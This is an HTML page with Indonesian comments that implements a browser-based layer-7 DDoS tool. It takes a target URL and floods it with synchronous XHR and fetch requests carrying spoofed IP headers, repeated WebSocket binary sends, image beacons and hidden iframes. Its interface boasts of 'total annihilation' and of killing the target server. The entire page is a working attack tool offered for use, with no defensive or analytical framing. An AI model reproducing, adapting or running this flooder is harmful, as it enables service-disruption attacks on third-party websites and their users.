<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRUTAL L7 DDOS - MULTI VECTOR</title>
    <style>
        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
        input, button { background: #1a0000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; margin: 5px; font-weight: bold; }
        .log { background: #0a0000; height: 400px; overflow-y: scroll; font-size: 11px; margin-top: 15px; padding: 8px; border: 2px solid #ff0000; }
        h2 { color: #ff0000; text-shadow: 0 0 5px red; }
        button:hover { background: #ff0000; color: #000; cursor: pointer; }
    </style>
</head>
<body>
<h2>🔥 EXTREME MULTI-THREAD HTTP/1.1 + HTTP/2 + WS + XMLHttpRequest FLOOD 🔥</h2>
<label>Target URL:</label><br>
<input type="text" id="targetUrl" placeholder="https://example.com" style="width: 80%;">
<button id="startBtn">💀 START TOTAL ANNIHILATION 💀</button>
<button id="stopBtn">✋ STOP</button>
<div class="log" id="log"></div>
<script>
    let active = false;
    let threads = 500;
    let reqCount = 0;
    let errCount = 0;
    let wsConnections = [];

    function log(msg) {
        const div = document.getElementById('log');
        div.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        div.scrollTop = div.scrollHeight;
    }

    // XHR synchronous blocking + async flood (legacy but heavy)
    function xhrFlood(url, id) {
        while(active) {
            for(let i=0; i<20; i++) { // batch 20 request per loop
                if(!active) break;
                const xhr = new XMLHttpRequest();
                const randomUrl = url + '/' + Math.random().toString(36) + '?t=' + Date.now() + '_' + id + '_' + i;
                try {
                    xhr.open('GET', randomUrl, false); // synchronous = blokir event loop tapi brutal ke target
                    xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
                    xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255));
                    xhr.send();
                    reqCount++;
                    if(reqCount % 100 === 0) log(`[XHR-${id}] Req: ${reqCount} | Status: ${xhr.status}`);
                } catch(e) {
                    errCount++;
                    if(errCount % 50 === 0) log(`[XHR-ERROR] ${e.message}`);
                }
            }
        }
    }

    // Fetch + keep-alive + no delay
    async function fetchFlood(url, id) {
        while(active) {
            const randomPath = '/' + Math.random().toString(36).substring(2) + '?' + Date.now() + '_' + id;
            const fullUrl = url + randomPath;
            const headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
                'Cache-Control': 'no-store, no-cache, max-age=0',
                'Pragma': 'no-cache',
                'X-Spoof-IP': Math.floor(Math.random()*4294967295),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'X-Requested-With': 'XMLHttpRequest'
            };
            try {
                const res = await fetch(fullUrl, { method: 'GET', headers, mode: 'cors', credentials: 'include', keepalive: true });
                reqCount++;
                if(reqCount % 50 === 0) log(`[FETCH-${id}] ${res.status} | Total req: ${reqCount}`);
                await res.text().catch(()=>{});
            } catch(e) {
                errCount++;
            }
        }
    }

    // WebSocket bomb (jika support)
    function wsBomb(url, id) {
        let wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
        function createWS() {
            if(!active) return;
            try {
                const ws = new WebSocket(wsUrl);
                wsConnections.push(ws);
                ws.onopen = () => {
                    setInterval(() => {
                        if(ws.readyState === WebSocket.OPEN && active) {
                            ws.send(new ArrayBuffer(1024 * 64)); // 64KB binary setiap 10ms
                            reqCount++;
                        }
                    }, 10);
                };
                ws.onclose = () => setTimeout(createWS, 1);
                ws.onerror = () => ws.close();
            } catch(e) {}
        }
        for(let i=0; i<50; i++) createWS(); // 50 websocket persistent
    }

    // Image beacon bomb (via Image object)
    function imgFlood(url, id) {
        while(active) {
            const img = new Image();
            const randUrl = url + '/img_' + Math.random() + '.jpg?' + Date.now() + '_' + id;
            img.src = randUrl;
            reqCount++;
            if(reqCount % 200 === 0) log(`[IMG-${id}] Beacon sent`);
        }
    }

    // iframe injection ke DOM (membebani memory target)
    function iframeOverload(url) {
        const iframeContainer = document.createElement('div');
        iframeContainer.style.display = 'none';
        document.body.appendChild(iframeContainer);
        setInterval(() => {
            if(!active) return;
            for(let i=0;i<30;i++) {
                const iframe = document.createElement('iframe');
                iframe.src = url + '?' + Math.random();
                iframeContainer.appendChild(iframe);
                setTimeout(() => iframe.remove(), 100);
                reqCount++;
            }
        }, 100);
    }

    function startTotalFlood() {
        let target = document.getElementById('targetUrl').value.trim();
        if(!target) {
            alert("Masukkan URL target!");
            return;
        }
        if(!target.startsWith('http')) target = 'https://' + target;
        if(active) {
            log("Already active. Stop first.");
            return;
        }
        active = true;
        reqCount = 0;
        errCount = 0;
        log(`💀💀💀 STARTING BRUTAL DDOS ON: ${target} 💀💀💀`);
        log(`Threads: ${threads} | Method: XHR sync + Fetch async + WebSocket + Image + iframe`);

        // Launch XHR synchronous threads (paling heavy)
        for(let i=0; i<200; i++) {
            setTimeout(() => xhrFlood(target, i), i*2);
        }
        // Launch fetch async threads
        for(let i=0; i<200; i++) {
            setTimeout(() => fetchFlood(target, i+200), i*2);
        }
        // Image bomb threads
        for(let i=0; i<80; i++) {
            setTimeout(() => imgFlood(target, i+400), i*5);
        }
        // WebSocket bomb
        wsBomb(target, 0);
        // iframe overload
        iframeOverload(target);
        
        log("✅ ALL ENGINES ACTIVE - WebSocket, XHR sync, fetch, Image beacon, iframe injection");
        setInterval(() => {
            if(active) log(`📊 STATS - Total Requests: ${reqCount} | Errors: ${errCount} | Rate: ${Math.floor(reqCount/ ((Date.now() - startTime)/1000))}/sec`);
        }, 5000);
    }

    function stopFlood() {
        active = false;
        wsConnections.forEach(ws => { try{ws.close()}catch(e){} });
        wsConnections = [];
        log(`🛑 STOPPED. Total requests: ${reqCount} | Errors: ${errCount}`);
    }

    let startTime;
    const originalStart = startTotalFlood;
    startTotalFlood = function() {
        startTime = Date.now();
        originalStart();
    };

    document.getElementById('startBtn').onclick = startTotalFlood;
    document.getElementById('stopBtn').onclick = stopFlood;
    log("READY. Masukkan target (contoh: https://target.com) lalu klik TOTAL ANNIHILATION.");
    log("⚠️ INI BRUTAL - XHR SYNC MEMBLOKIR TAB BROWSER ANDA, TETAPI JUGA MEMBUNUH SERVER TARGET.");
</script>
</body>
</html>
